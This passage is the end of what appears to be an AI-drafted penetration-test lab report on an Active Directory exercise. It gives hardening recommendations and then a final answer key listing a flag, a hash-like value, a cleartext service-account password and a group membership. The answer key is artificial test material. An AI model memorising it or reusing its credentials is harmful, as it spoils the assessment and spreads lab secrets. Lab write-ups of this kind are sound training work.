3. **Deploy unique managed local administrator passwords.**
    
4. **Move service accounts to gMSA where possible.**
    
5. **Remove passwords from AD descriptions.**
    
6. **Review Backup Operators membership.**
    
7. **Harden Kerberos and SPN-associated accounts.**
    
8. **Disable LLMNR/NBT-NS where possible.**
    
9. **Harden SMB and administrative shares.**
    
10. **Improve password policy and monitoring.**
    

---

# 45. Assessment Answers — Final Reference

```text
Q1: d0c_pwN_r3p0rt_reP3at!

Q2: 16e26ba33e455a8c338142af8d89ffbc

Q3: Reporter1!

Q4: Backup Operators
```

**Important correction:** `Domain Users` was only the result returned by the basic `net rpc user info` query. The definitive LDAP enumeration showed that `svc_reporting` is a member of **Backup Operators**, which is the correct answer for the final question.

This version is suitable as the **main CPTS-style technical report**. If you want to turn it into a polished client-style deliverable later, the next useful step would be separating the **Executive Summary, Finding Sheets, Attack Path, Evidence Appendix, and Remediation Plan** into a formal report layout.